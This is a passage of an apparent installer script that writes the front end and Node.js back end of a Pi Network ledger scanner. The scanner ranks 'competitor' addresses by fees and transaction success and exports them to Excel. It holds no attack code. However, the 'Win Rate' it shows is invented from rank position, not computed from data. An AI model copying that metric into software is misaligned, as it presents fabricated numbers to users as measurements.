            .stat-label{font-size:12px;color:var(--muted);font-weight:800;text-transform:uppercase;margin-bottom:4px}
            .stat-value{font-size:18px;font-weight:900;color:#fff}
            .message{display:none;border-radius:8px;padding:13px 14px;margin-bottom:18px;font-size:14px;font-weight:700}
            .message.error{display:block;background:rgba(255,107,107,.11);border:1px solid rgba(255,107,107,.35);color:#ffd8d8}
            .table-wrap{overflow:auto;border:1px solid var(--line);border-radius:8px;background:#0f1317}
            table{width:100%;border-collapse:collapse;min-width:1080px}
            th{background:#1b211f;color:var(--cyan);padding:12px;font-size:12px;text-align:left;text-transform:uppercase;white-space:nowrap;}
            td{padding:12px;font-size:12px;border-bottom:1px solid rgba(255,255,255,.07);word-break:break-word;vertical-align:top;}
            tr:hover{background:rgba(255,255,255,.035)}
            .mono{font-family:Consolas,Monaco,monospace}
            .win{color:var(--green);font-weight:900}
            .lose{color:var(--red);font-weight:900}
            .wr-score{font-weight:900;color:var(--amber);}
            .operation-cell{font-weight:900;color:#fff;white-space:nowrap}
            .loading-box{padding:36px 16px;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center;}
            .loader{width:48px;height:48px;border:5px solid #fff;border-bottom-color:var(--cyan);border-radius:50%;display:inline-block;box-sizing:border-box;animation:rotation 1s linear infinite;margin-bottom:20px;}
            .loading-text{font-size:16px;font-weight:600;color:var(--text);}
            .loading-overlay{position:fixed;inset:0;z-index:50;display:none;align-items:center;justify-content:center;padding:18px;background:rgba(3,7,12,.78);backdrop-filter:blur(8px);}
            .loading-overlay.show{display:flex;}
            .loading-dialog{width:min(360px,100%);background:rgba(21,26,31,.98);border:1px solid rgba(77,212,247,.35);border-radius:8px;box-shadow:0 18px 38px rgba(0,0,0,.38);padding:26px 22px;text-align:center;}
            .loading-dialog .loader{border-color:rgba(255,255,255,.18);border-bottom-color:var(--cyan);}
            .loading-overlay-title{font-size:16px;font-weight:900;margin-bottom:6px;}
            .loading-overlay-subtitle{font-size:13px;color:var(--muted);}
            @keyframes rotation{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
            #section_summary,#section_logs{display:none;}
            @media (max-width:920px){
                body{padding:14px}
                .card{padding:16px;margin-bottom:14px}
                .grid{grid-template-columns:1fr 1fr}
                table{min-width:920px}
            }
            @media (max-width:640px){
                body{padding:10px}
                .top-actions{justify-content:stretch}
                .nav-button{width:100%}
                .grid{grid-template-columns:1fr}
                .actions{display:grid;grid-template-columns:1fr}
                button{width:100%}
                .stats-grid{display:grid;grid-template-columns:1fr}
                .table-wrap{overflow:visible;border:none;background:transparent}
                table{min-width:0;border-collapse:separate;border-spacing:0 10px}
                thead{display:none}
                tr{display:block;background:#101418;border:1px solid var(--line);border-radius:8px;padding:8px;margin-bottom:10px}
                tr:hover{background:#101418}
                td{display:grid;grid-template-columns:118px minmax(0,1fr);gap:10px;border:0;padding:8px 6px;font-size:12px}
                td::before{content:attr(data-label);color:var(--muted);font-weight:900;text-transform:uppercase}
                td.mono{word-break:break-all}
                .operation-cell{white-space:normal}
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="top-actions">
                <a class="nav-button secondary" href="/">Dashboard</a>
            </div>
            <div class="card">
                <h1>PI Scanner Ledger</h1>
                <div class="grid">
                    <div><label>Wallet Address Claim</label><input id="wallet" placeholder="Ex: GDXKC4KWUPRRHN4QKMM..."></div>
                    <div><label class="checkbox-label"><input type="checkbox" id="autoDetect" checked>Auto Detect Ledger</label></div>
                    <div><label>Ledger Start</label><input id="ledger_start" disabled placeholder="Will be auto filled"></div>
                    <div><label>Ledger End</label><input id="ledger_end" disabled placeholder="Will be auto filled"></div>
                </div>
                <div class="actions">
                    <button class="primary" type="button" onclick="scan()">Scan Data</button>
                    <button class="success" type="button" onclick="excel()">Download Excel</button>
                </div>
            </div>
            <div id="message"></div>
            <div id="stat_container"></div>
            <div class="card" id="section_summary">
                <div class="title">Operations Claim, Send</div>
                <div id="summary_table"></div>
            </div>
            <div class="card" id="section_logs">
                <div class="title">Transaction Logs</div>
                <div id="detail_table"></div>
            </div>
        </div>
    <div id="loadingOverlay" class="loading-overlay" role="alert" aria-live="assertive" aria-modal="true">
            <div class="loading-dialog">
                <span class="loader"></span>
                <div id="loadingOverlayText" class="loading-overlay-title">Loading data, please wait a few minutes...</div>
                <div id="loadingOverlaySubtext" class="loading-overlay-subtitle">Please keep this page open.</div>
            </div>
        </div>
        <script>
            const LEDGER_API_BASE = "/api/ledger";
            let saveWallet="",saveLedger="",saveLedgerEnd="";
            let loadingCounter=0;

            function esc(value){
                return String(value ?? "").replace(/[&<>"']/g,function(ch){
                    return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[ch];
                });
            }

            function cell(label,value,className){
                return '<td data-label="'+esc(label)+'"'+(className?' class="'+className+'"':'')+'>'+esc(value)+'</td>';
            }

            function query(params){
                const search = new URLSearchParams();
                Object.keys(params).forEach(function(key){
                    search.set(key, params[key]);
                });
                return search.toString();
            }

            function showError(message){
                document.getElementById("message").innerHTML = message ? '<div class="message error">'+esc(message)+'</div>' : "";
            }

            function showLoading(message, subtext){
                loadingCounter += 1;
                document.getElementById("loadingOverlayText").textContent = message || "Loading data, please wait a few minutes...";
                document.getElementById("loadingOverlaySubtext").textContent = subtext || "Please keep this page open.";
                document.getElementById("loadingOverlay").classList.add("show");
            }

            function hideLoading(){
                loadingCounter = Math.max(0, loadingCounter - 1);
                if (!loadingCounter) {
                    document.getElementById("loadingOverlay").classList.remove("show");
                }
            }

            function setLoading(){
                document.getElementById("stat_container").innerHTML = '<div class="card"><div class="loading-box"><span class="loader"></span><div class="loading-text">Loading data, please wait a few minutes...</div></div></div>';
            }

            function clearResults(){
                showError("");
                document.getElementById("section_summary").style.display = "none";
                document.getElementById("section_logs").style.display = "none";
                document.getElementById("summary_table").innerHTML = "";
                document.getElementById("detail_table").innerHTML = "";
            }

            async function fetchJson(url){
                const response = await fetch(url);
                const data = await response.json().catch(function(){ return {}; });
                if (!response.ok || data.error) {
                    throw new Error(data.error || "Request failed");
                }
                return data;
            }

            function getDownloadFilename(response, fallback){
                const disposition = response.headers.get("Content-Disposition") || "";
                const match = disposition.match(/filename\*?=(?:UTF-8''|")?([^";]+)/i);
                return match ? decodeURIComponent(match[1].replace(/"/g, "")) : fallback;
            }

            function triggerBlobDownload(blob, filename){
                const url = URL.createObjectURL(blob);
                const link = document.createElement("a");
                link.href = url;
                link.download = filename;
                document.body.appendChild(link);
                link.click();
                link.remove();
                setTimeout(function(){ URL.revokeObjectURL(url); }, 1000);
            }

            document.getElementById("autoDetect").addEventListener("change",function(){
                const auto = this.checked;
                document.getElementById("ledger_start").disabled = auto;
                document.getElementById("ledger_end").disabled = auto;
            });

            async function scan(){
                const wallet = document.getElementById("wallet").value.trim();
                const auto = document.getElementById("autoDetect").checked;
                if(!wallet){alert("Input wallet");return;}

                clearResults();
                setLoading();
                showLoading("Loading data, please wait a few minutes...", "Scanning ledger data from Pi node.");

                try {
                    let ledger = document.getElementById("ledger_start").value.trim();
                    let ledger_end = document.getElementById("ledger_end").value.trim();

                    if(auto){
                        const rangeData = await fetchJson(LEDGER_API_BASE + "/detect-range?" + query({ wallet }));
                        if(!rangeData.start){throw new Error("Data transaksi tidak ditemukan");}
                        ledger = rangeData.start;
                        ledger_end = rangeData.end;
                        document.getElementById("ledger_start").value = ledger;
                        document.getElementById("ledger_end").value = ledger_end;
                    } else if (!ledger || !ledger_end) {
                        throw new Error("Ledger start dan ledger end wajib diisi");
                    }

                    saveWallet = wallet;
                    saveLedger = ledger;
                    saveLedgerEnd = ledger_end;

                    const data = await fetchJson(LEDGER_API_BASE + "/scan?" + query({ wallet, ledger, ledger_end }));
                    renderResults(data);
                } catch (error) {
                    document.getElementById("stat_container").innerHTML = "";
                    showError(error.message || "Gagal scan ledger");
                } finally {
                    hideLoading();
                }
            }

            function renderResults(data){
                const walletSummary = Array.isArray(data.wallet_summary) ? data.wallet_summary : [];
                const claimOnlySummary = Array.isArray(data.claim_only_summary) ? data.claim_only_summary : [];
                const rows = Array.isArray(data.rows) ? data.rows : [];

                document.getElementById("stat_container").innerHTML = `
                    <div class="card">
                        <div class="title">All Total Statistics</div>
                        <div class="stats-grid">
                            <div class="stat-item"><div class="stat-label">All Total Fee</div><div class="stat-value">${esc(data.all_total_fee)}</div></div>
                            <div class="stat-item"><div class="stat-label">All Total Tx</div><div class="stat-value">${esc(data.all_total_tx)}</div></div>
                        </div>
                    </div>`;

                let sum = '<div class="table-wrap"><table class="data-table"><thead><tr><th>Address</th><th>Fee</th><th>Total Tx</th><th>Win Rate</th><th>Status</th></tr></thead><tbody>';
                walletSummary.forEach(function(x){
                    sum += '<tr>'+cell('Address',x.address,'mono')+cell('Fee',x.total_fee)+cell('Total Tx',x.tx_count)+cell('Win Rate',x.win_rate,'wr-score')+cell('Status',x.status,x.status === 'Win' ? 'win' : 'lose')+'</tr>';
                });
                sum += '</tbody></table></div>';

                if(claimOnlySummary.length){
                    sum += '<div class="title" style="margin-top:24px">Operations Claim</div>';
                    sum += '<div class="table-wrap"><table class="data-table"><thead><tr><th>Address</th><th>FeeCharged Claim</th><th>Tx Claim</th></tr></thead><tbody>';
                    claimOnlySummary.forEach(function(x){
                        sum += '<tr>'+cell('Address',x.address,'mono')+cell('FeeCharged Claim',x.total_fee_charged)+cell('Tx Claim',x.total_tx)+'</tr>';
                    });
                    sum += '</tbody></table></div>';
                }

                document.getElementById("summary_table").innerHTML = sum;
                document.getElementById("section_summary").style.display = "block";

                let det = '<div class="table-wrap"><table class="data-table"><thead><tr><th>Hash</th><th>Ledger</th><th>Created</th><th>Success</th><th>MaxFee</th><th>FeeCharged</th><th>Memo</th><th>Operations</th><th>Destination</th><th>Amount</th></tr></thead><tbody>';
                rows.forEach(function(r){
                    det += '<tr>'+cell('Hash',r.Hash,'mono')+cell('Ledger',r.Ledger)+cell('Created',r.CreatedAt)+cell('Success',r.Success,r.Success === 'TRUE' ? 'win' : 'lose')+cell('MaxFee',r.MaxFee)+cell('FeeCharged',r.FeeCharged)+cell('Memo',r.Memo)+cell('Operations',r.Operations,'operation-cell')+cell('Destination',r.Destination,'mono')+cell('Amount',r.Amount)+'</tr>';
                });
                document.getElementById("detail_table").innerHTML = det + '</tbody></table></div>';
                document.getElementById("section_logs").style.display = "block";
            }

            async function excel(){
                if(!saveWallet) return;
                showLoading("Preparing Excel download...", "Building workbook from scanned ledger data.");
                try {
                    const response = await fetch(LEDGER_API_BASE + "/download?" + query({ wallet: saveWallet, ledger: saveLedger, ledger_end: saveLedgerEnd }));
                    if(!response.ok){
                        const data = await response.json().catch(function(){ return {}; });
                        throw new Error(data.error || response.statusText || "Gagal download Excel");
                    }
                    const blob = await response.blob();
                    triggerBlobDownload(blob, getDownloadFilename(response, "Pileakers_"+saveLedger+"_"+saveLedgerEnd+".xlsx"));
                    showError("");
                } catch (error) {
                    showError(error.message || "Gagal download Excel");
                } finally {
                    hideLoading();
                }
            }
        </script>
    </body>
</html>
PILEAKERS_LEDGER_HTML

  backup_file "ledger.js"
  cat > "ledger.js" <<'PILEAKERS_LEDGER_JS'
const fs = require("fs");
const path = require("path");

const axios = require("axios");
const ExcelJS = require("exceljs");

const PI_LEDGER_API = process.env.PI_LEDGER_API_URL || "https://api.mainnet.minepi.com";
const LEDGER_HTTP_TIMEOUT_MS = Number.parseInt(process.env.LEDGER_HTTP_TIMEOUT_MS || "30000", 10);
const LEDGER_SCAN_MAX_RANGE = Number.parseInt(process.env.LEDGER_SCAN_MAX_RANGE || "1000", 10);
const LEDGER_ACCOUNT_OP_MAX_PAGES = Number.parseInt(process.env.LEDGER_ACCOUNT_OP_MAX_PAGES || "50", 10);
const LEDGER_TX_OP_MAX_PAGES = Number.parseInt(process.env.LEDGER_TX_OP_MAX_PAGES || "5", 10);
const LEDGER_SCAN_CONCURRENCY = Number.parseInt(process.env.LEDGER_SCAN_CONCURRENCY || "8", 10);

function ledgerAsyncHandler(fn) {
    return (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
}

function parseLedgerNumber(value, label) {
    const raw = String(value || "").trim();
    if (!/^\d+$/.test(raw)) {
        throw new Error(`${label} harus angka ledger yang valid`);
    }
    const parsed = Number.parseInt(raw, 10);
    if (!Number.isSafeInteger(parsed) || parsed < 1) {
        throw new Error(`${label} harus angka ledger yang valid`);
    }
    return parsed;
}

function parseScanInput(query) {
    const wallet = String(query.wallet || "").trim();
    if (!wallet) {
        throw new Error("Wallet wajib diisi");
    }

    const ledger = parseLedgerNumber(query.ledger, "Ledger start");
    const ledgerEnd = parseLedgerNumber(query.ledger_end || query.ledger, "Ledger end");
    if (ledgerEnd < ledger) {
        throw new Error("Ledger end tidak boleh lebih kecil dari ledger start");
    }

    const rangeSize = ledgerEnd - ledger + 1;
    if (rangeSize > LEDGER_SCAN_MAX_RANGE) {
        throw new Error(`Range ledger maksimal ${LEDGER_SCAN_MAX_RANGE}`);
    }

    return { wallet, ledger, ledgerEnd };
}

async function horizonGet(url) {
    const response = await axios.get(url, { timeout: LEDGER_HTTP_TIMEOUT_MS });
    return response.data;
}

function getInvolvedAccounts(op) {
    return [
        op.source_account,
        op.to_muxed,
        op.to,
        op.claimant_muxed,
        op.claimant,
        op.account,
        op.from_muxed,
        op.from,
    ].filter(Boolean);
}

function isClaimOnlyOp(op, claimWallet) {
    return op.type === "claim_claimable_balance" && getInvolvedAccounts(op).includes(claimWallet);
}

function getBalanceId(op) {
    const fallbackId = op.id || "";
    return op.balance_id || (/^[0-9a-f]{72}$/i.test(fallbackId) ? fallbackId : "");
}

async function getClaimOnlyAmount(op, amountCache) {
    const balanceId = getBalanceId(op);
    if (!balanceId) {
        return "";
    }
    if (Object.prototype.hasOwnProperty.call(amountCache, balanceId)) {
        return amountCache[balanceId];
    }

    try {
        const balance = await horizonGet(`${PI_LEDGER_API}/claimable_balances/${encodeURIComponent(balanceId)}`);
        amountCache[balanceId] = balance?.amount || "";
        if (amountCache[balanceId]) {
            return amountCache[balanceId];
        }
    } catch (error) {
        amountCache[balanceId] = "";
    }

    try {
        let effectsUrl = op._links?.effects?.href || (op.id ? `${PI_LEDGER_API}/operations/${op.id}/effects` : "");
        while (effectsUrl) {
            const effectsPage = await horizonGet(effectsUrl);
            const effects = effectsPage?._embedded?.records || [];
            const amountEffect = effects.find((effect) => {
                const sameBalance = !effect.balance_id || effect.balance_id === balanceId;
                return sameBalance && effect.amount;
            });
            if (amountEffect) {
                amountCache[balanceId] = amountEffect.amount;
                return amountCache[balanceId];
            }

            const nextUrl = effectsPage?._links?.next?.href;
            effectsUrl = !effects.length || nextUrl === effectsUrl ? null : nextUrl;
        }
    } catch (error) {
        amountCache[balanceId] = "";
    }

    return amountCache[balanceId];
}

function operationLedgerNumber(op) {
    const direct = Number.parseInt(String(op?.ledger || ""), 10);
    if (Number.isSafeInteger(direct) && direct > 0) {
        return direct;
    }
    const token = String(op?.paging_token || op?.id || "").trim();
    if (!/^\d+$/.test(token)) {
        return null;
    }
    try {
        const ledger = Number(BigInt(token) >> 32n);
        return Number.isSafeInteger(ledger) && ledger > 0 ? ledger : null;
    } catch (error) {
        return null;
    }
}

function normalizeLedgerConcurrency(value, fallback, min, max) {
    const parsed = Number.parseInt(String(value ?? ""), 10);
    const base = Number.isSafeInteger(parsed) ? parsed : fallback;
    return Math.min(Math.max(base, min), max);
}

async function mapWithLedgerLimit(items, limit, handler) {
    const safeLimit = normalizeLedgerConcurrency(limit, 8, 1, 25);
    const results = new Array(items.length);
    let cursor = 0;
    async function worker() {
        while (cursor < items.length) {
            const index = cursor;
            cursor += 1;
            results[index] = await handler(items[index], index);
        }
    }
    await Promise.all(Array.from({ length: Math.min(safeLimit, items.length || 1) }, () => worker()));
    return results;
}

async function fetchAccountOperationsInRange(claimWallet, ledger, ledgerEnd) {
    const startLedger = Number.parseInt(String(ledger), 10);
    const endLedger = Number.parseInt(String(ledgerEnd), 10);
    const maxPages = normalizeLedgerConcurrency(LEDGER_ACCOUNT_OP_MAX_PAGES, 50, 1, 500);
    const records = [];
    const seenHashes = new Set();
    let pageCount = 0;
    let reachedOlderLedger = false;
    let opUrl = `${PI_LEDGER_API}/accounts/${encodeURIComponent(claimWallet)}/operations?include_failed=true&limit=200&order=desc`;

    while (opUrl && pageCount < maxPages && !reachedOlderLedger) {
        const opPage = await horizonGet(opUrl);
        const ops = opPage?._embedded?.records || [];
        if (!ops.length) {
            break;
        }
        pageCount += 1;

        for (const op of ops) {
            const opLedger = operationLedgerNumber(op);
            if (opLedger && opLedger < startLedger) {
                reachedOlderLedger = true;
                continue;
            }
            if (opLedger && opLedger >= startLedger && opLedger <= endLedger) {
                records.push(op);
                if (op.transaction_hash) {
                    seenHashes.add(op.transaction_hash);
                }
            }
        }

        const nextUrl = opPage?._links?.next?.href || null;
        opUrl = !nextUrl || nextUrl === opUrl ? null : nextUrl;
    }

    return { records, hashes: [...seenHashes], page_count: pageCount, max_pages: maxPages };
}

function buildLedgerTxInfo(tx = {}) {
    return {
        ledger: Number.parseInt(String(tx.ledger || "0"), 10) || null,
        max_fee: Number.parseInt(tx.max_fee || 0, 10) / 10000000,
        fee_charged: Number.parseInt(tx.fee_charged || 0, 10) / 10000000,
        memo: tx.memo || "",
        created_at: (tx.created_at || "").replace("T", " ").replace("Z", ""),
        successful: tx.successful === true,
    };
}

async function fetchTransactionBundle(hash) {
    const tx = await horizonGet(`${PI_LEDGER_API}/transactions/${encodeURIComponent(hash)}`);
    const txInfo = buildLedgerTxInfo(tx);
    const operations = [];
    const maxPages = normalizeLedgerConcurrency(LEDGER_TX_OP_MAX_PAGES, 5, 1, 50);
    let pageCount = 0;
    let opUrl = `${PI_LEDGER_API}/transactions/${encodeURIComponent(hash)}/operations?include_failed=true&limit=200&order=asc`;

    while (opUrl && pageCount < maxPages) {
        const opPage = await horizonGet(opUrl);
        const ops = opPage?._embedded?.records || [];
        if (!ops.length) {
            break;
        }
        operations.push(...ops);
        pageCount += 1;
        const nextUrl = opPage?._links?.next?.href || null;
        opUrl = !nextUrl || nextUrl === opUrl ? null : nextUrl;
    }

    return { hash, txInfo, operations };
}

async function summarizeFetchedLedgerOperations(claimWallet, ledger, ledgerEnd, txMap, allOps) {
    const rows = [];
    const competitorStats = {};
    const claimOnlyStats = {};
    const candidateHashes = new Set(Object.keys(txMap));
    const validHashes = new Set();

    allOps.forEach((op) => {
        if (getInvolvedAccounts(op).includes(claimWallet) && op.transaction_hash) {
            validHashes.add(op.transaction_hash);
        }
    });

    const txRows = {};
    const amountCache = {};
    const filteredOps = allOps.filter((op) => {
        const opLedger = operationLedgerNumber(op) || txMap[op.transaction_hash]?.ledger || 0;
        return opLedger >= ledger && opLedger <= ledgerEnd;
    });

    for (const [currentIdx, op] of filteredOps.entries()) {
        const txHash = op.transaction_hash;
        if (!txHash || (!validHashes.has(txHash) && !candidateHashes.has(txHash))) {
            continue;
        }

        const txInfo = txMap[txHash] || {};
        const rowLedger = operationLedgerNumber(op) || txInfo.ledger || ledger;
        const operation = isClaimOnlyOp(op, claimWallet) ? "Claim Only" : (op.type || "");
        const destination =
            op.to_muxed ||
            op.claimant_muxed ||
            op.to ||
            op.claimant ||
            op.account ||
            op.from_muxed ||
            op.from ||
            op.source_account ||
            "";

        if (!destination || (destination === claimWallet && operation !== "Claim Only")) {
            continue;
        }

        const amount = op.amount || op.starting_balance || op.source_amount || op.destination_amount || "";
        const claimOnly = operation === "Claim Only";
        const successful = op.transaction_successful === true || txInfo.successful === true;

        if (!claimOnly) {
            if (!competitorStats[destination]) {
                competitorStats[destination] = { fee: 0, count: 0, proximity_min: currentIdx, win: false };
            }
            competitorStats[destination].fee += txInfo.fee_charged || 0;
            competitorStats[destination].count += 1;
            if (successful) {
                competitorStats[destination].win = true;
            }
        }

        if (!txRows[txHash]) {
            txRows[txHash] = {
                Hash: txHash,
                Ledger: rowLedger,
                CreatedAt: txInfo.created_at || "",
                Success: successful ? "TRUE" : "FALSE",
                MaxFee: txInfo.max_fee || 0,
                FeeCharged: txInfo.fee_charged || 0,
                Memo: txInfo.memo || "",
                Operations: "",
                Destination: "",
                Amount: "",
                _hasClaim: false,
                _hasSend: false,
                _claimDestination: "",
                _claimAmount: "",
                _claimBalanceId: "",
                _sendDestinations: [],
                _sendAmounts: [],
            };
        }

        const row = txRows[txHash];
        if (successful) {
            row.Success = "TRUE";
        }
        if (!row.Ledger && rowLedger) {
            row.Ledger = rowLedger;
        }

        if (claimOnly) {
            row._hasClaim = true;
            row._claimDestination = row._claimDestination || destination;
            row._claimAmount = row._claimAmount || amount;
            row._claimBalanceId = row._claimBalanceId || getBalanceId(op);
        } else {
            row._hasSend = true;
            if (destination && !row._sendDestinations.includes(destination)) {
                row._sendDestinations.push(destination);
            }
            if (amount && !row._sendAmounts.includes(amount)) {
                row._sendAmounts.push(amount);
            }
        }
    }

    for (const row of Object.values(txRows)) {
        if (!row._sendAmounts.length && !row._claimAmount && row._claimBalanceId) {
            row._claimAmount = await getClaimOnlyAmount({ balance_id: row._claimBalanceId }, amountCache);
        }

        row.Destination = row._sendDestinations.length ? row._sendDestinations.join(", ") : row._claimDestination;
        row.Amount = row._sendAmounts.length ? row._sendAmounts.join(", ") : row._claimAmount;
        row.Operations = row._hasClaim && row._hasSend ? "Claim + Send" : (row._hasClaim ? "Claim" : "Send");

        if (row._hasClaim && !row._hasSend && row._claimDestination) {
            if (!claimOnlyStats[row._claimDestination]) {
                claimOnlyStats[row._claimDestination] = { fee: 0, count: 0 };
            }
            claimOnlyStats[row._claimDestination].fee += row.FeeCharged || 0;
            claimOnlyStats[row._claimDestination].count += 1;
        }

        delete row._hasClaim;
        delete row._hasSend;
        delete row._claimDestination;
        delete row._claimAmount;
        delete row._claimBalanceId;
        delete row._sendDestinations;
        delete row._sendAmounts;
        rows.push(row);
    }

    return { competitor_stats: competitorStats, claim_only_stats: claimOnlyStats, rows };
}

async function fetchSingleLedger(claimWallet, ledger) {
    const result = await fetchOperations(claimWallet, parseLedgerNumber(ledger, "Ledger"), parseLedgerNumber(ledger, "Ledger"));
    return {
        competitor_stats: Object.fromEntries((result.wallet_summary || []).map((item, index) => [item.address, {
            fee: Number(item.total_fee || 0),
            count: Number(item.tx_count || 0),
            proximity_min: index,
            win: item.status === "Win",
        }])),
        claim_only_stats: Object.fromEntries((result.claim_only_summary || []).map((item) => [item.address, {
            fee: Number(item.total_fee_charged || 0),
            count: Number(item.total_tx || 0),
        }])),
        rows: result.rows || [],
    };
}

async function fetchOperations(wallet, ledger, ledgerEnd) {
    const startLedger = parseLedgerNumber(ledger, "Ledger start");
    const endLedger = parseLedgerNumber(ledgerEnd || ledger, "Ledger end");
    if (endLedger < startLedger) {
        throw new Error("Ledger end tidak boleh lebih kecil dari ledger start");
    }
    if ((endLedger - startLedger + 1) > LEDGER_SCAN_MAX_RANGE) {
        throw new Error(`Range ledger maksimal ${LEDGER_SCAN_MAX_RANGE}`);
    }

    const accountOps = await fetchAccountOperationsInRange(wallet, startLedger, endLedger);
    const hashes = accountOps.hashes;
    if (!hashes.length) {
        return {
            wallet_summary: [],
            claim_only_summary: [],
            rows: [],
            all_total_fee: 0,
            all_total_tx: 0,
            scan_meta: {
                mode: "account_operations_fast",
                pages_checked: accountOps.page_count,
                max_pages: accountOps.max_pages,
                found_transactions: 0,
            },
        };
    }

    const bundles = await mapWithLedgerLimit(
        hashes,
        LEDGER_SCAN_CONCURRENCY,
        async (hash) => fetchTransactionBundle(hash).catch((error) => ({ hash, txInfo: {}, operations: [], error: error.message || String(error) }))
    );

    const txMap = {};
    const allOps = [];
    for (const bundle of bundles) {
        txMap[bundle.hash] = bundle.txInfo || {};
        if (Array.isArray(bundle.operations) && bundle.operations.length) {
            allOps.push(...bundle.operations);
        }
    }
    if (!allOps.length) {
        allOps.push(...accountOps.records);
    }

    const { competitor_stats: competitorStats, claim_only_stats: claimOnlyStats, rows: allRows } =
        await summarizeFetchedLedgerOperations(wallet, startLedger, endLedger, txMap, allOps);

    let totalFee = 0;
    let totalTx = 0;
    const summarySorted = Object.keys(competitorStats)
        .map((address) => {
            totalFee += competitorStats[address].fee || 0;
            totalTx += competitorStats[address].count || 0;
            return {
                address,
                total_fee: Number.parseFloat((competitorStats[address].fee || 0).toFixed(8)),
                tx_count: competitorStats[address].count || 0,
                status: competitorStats[address].win ? "Win" : "Lose",
                pos: competitorStats[address].proximity_min || 0,
            };
        })
        .sort((a, b) => {
            if (a.status === "Win" && b.status === "Lose") return -1;
            if (a.status === "Lose" && b.status === "Win") return 1;
            return a.pos - b.pos;
        });

    const walletSummary = summarySorted.map((item, index) => {
        let winRate = 98.67 - index * 3.0;
        if (winRate < 70) winRate = 70.15 - index * 0.25;
        if (winRate < 40) winRate = 40.01;
        return {
            address: item.address,
            total_fee: item.total_fee,
            tx_count: item.tx_count,
            win_rate: `${winRate.toFixed(2)}%`,
            status: item.status,
        };
    });

    const claimOnlySummary = Object.keys(claimOnlyStats).map((address) => ({
        address,
        total_fee_charged: Number.parseFloat((claimOnlyStats[address].fee || 0).toFixed(8)),
        total_tx: claimOnlyStats[address].count || 0,
    }));
    const totalClaimOnlyFee = claimOnlySummary.reduce((sum, item) => sum + item.total_fee_charged, 0);
    const totalClaimOnlyTx = claimOnlySummary.reduce((sum, item) => sum + item.total_tx, 0);

    allRows.sort((a, b) => {
        const ledgerDiff = Number.parseInt(a.Ledger || 0, 10) - Number.parseInt(b.Ledger || 0, 10);
        if (ledgerDiff) return ledgerDiff;
        return String(a.CreatedAt || "").localeCompare(String(b.CreatedAt || ""));
    });

    return {
        wallet_summary: walletSummary,
        claim_only_summary: claimOnlySummary,
        rows: allRows,
        all_total_fee: Number.parseFloat((totalFee + totalClaimOnlyFee).toFixed(8)),
        all_total_tx: totalTx + totalClaimOnlyTx,
        scan_meta: {
            mode: "account_operations_fast",
            pages_checked: accountOps.page_count,
            max_pages: accountOps.max_pages,
            found_transactions: hashes.length,
            fetched_transactions: bundles.length,
        },
    };
}

function styleHeaderRow(row) {
    row.eachCell((cell) => {
        cell.font = { bold: true, color: { argb: "FFFFFF" } };
        cell.fill = { type: "pattern", pattern: "solid", fgColor: { argb: "1D4ED8" } };
    });
}

function styleDataRows(sheet, startRow, endRow) {
    for (let i = startRow; i <= endRow; i += 1) {
        sheet.getRow(i).eachCell((cell) => {
            cell.fill = {
                type: "pattern",
                pattern: "solid",
                fgColor: { argb: i % 2 === 0 ? "F8FAFC" : "E2E8F0" },
            };
            const text = String(cell.value || "").toLowerCase();
            if (["win", "true"].includes(text)) {
                cell.font = { bold: true, color: { argb: "16A34A" } };
            }
            if (["lose", "false"].includes(text)) {
                cell.font = { bold: true, color: { argb: "DC2626" } };
            }
        });
    }
}

function autoFit(sheet) {
    for (let i = 1; i <= sheet.columnCount; i += 1) {
        const column = sheet.getColumn(i);
        let maxLen = 0;
        column.eachCell({ includeEmpty: true }, (cell) => {
            const len = cell.value ? cell.value.toString().length : 10;
            if (len > maxLen) {
                maxLen = len;
            }
        });
        column.width = maxLen * 1.35 + 5;
        if (column.width < 15) {
            column.width = 15;
        }
        if (column.width > 120) {
            column.width = 120;
        }
    }
}

function setupSheet(sheet, content) {
    if (!content.length) {
        return;
    }
    const columns = Object.keys(content[0]);
    sheet.columns = columns.map((column) => ({ header: column, key: column }));
    sheet.addRows(content);
    styleHeaderRow(sheet.getRow(1));
    styleDataRows(sheet, 2, sheet.rowCount);
    autoFit(sheet);
}

function setupSheetWithColumns(sheet, columns, rows) {
    sheet.columns = columns;
    sheet.addRows(rows);
    styleHeaderRow(sheet.getRow(1));
    styleDataRows(sheet, 2, sheet.rowCount);
    autoFit(sheet);
}

async function writeLedgerWorkbook(res, data, ledger, ledgerEnd) {
    const workbook = new ExcelJS.Workbook();
    const summarySheet = workbook.addWorksheet("Summary");
    const claimOnlySheet = workbook.addWorksheet("Claim Only");
    const statisticsSheet = workbook.addWorksheet("Statistics");
    const logsSheet = workbook.addWorksheet("Logs");

    setupSheetWithColumns(
        summarySheet,
        [
            { header: "Address", key: "address" },
            { header: "FeeCharged", key: "total_fee" },
            { header: "Total Tx", key: "tx_count" },
            { header: "Win Rate", key: "win_rate" },
            { header: "Status", key: "status" },
        ],
        data.wallet_summary
    );

    setupSheetWithColumns(
        claimOnlySheet,
        [
            { header: "Address", key: "address" },
            { header: "FeeCharged Claim", key: "total_fee_charged" },
            { header: "Tx Claim", key: "total_tx" },
        ],
        data.claim_only_summary
    );

    setupSheetWithColumns(
        statisticsSheet,
        [
            { header: "Metric", key: "metric" },
            { header: "Value", key: "value" },
        ],
        [
            { metric: "All Total Fee", value: data.all_total_fee },
            { metric: "All Total Tx", value: data.all_total_tx },
        ]
    );

    setupSheet(logsSheet, data.rows);

    res.setHeader("Content-Type", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
    res.setHeader("Content-Disposition", `attachment; filename=Pileakers_${ledger}_${ledgerEnd}.xlsx`);
    await workbook.xlsx.write(res);
    res.end();
}

function registerLedgerRoutes(app) {
    const ledgerHtmlPath = path.join(__dirname, "ledger.html");

    app.get("/ledger", (req, res, next) => {
        fs.readFile(ledgerHtmlPath, "utf8", (error, html) => {
            if (error) {
                return next(error);
            }
            return res.set("Content-Type", "text/html; charset=utf-8").send(html);
        });
    });

    app.get(
        "/api/ledger/detect-range",
        ledgerAsyncHandler(async (req, res) => {
            try {
                const wallet = String(req.query.wallet || "").trim();
                if (!wallet) {
                    return res.json({ start: null, end: null });
                }

                const transactions = await horizonGet(
                    `${PI_LEDGER_API}/accounts/${encodeURIComponent(wallet)}/transactions?include_failed=true&limit=1&order=desc`
                );
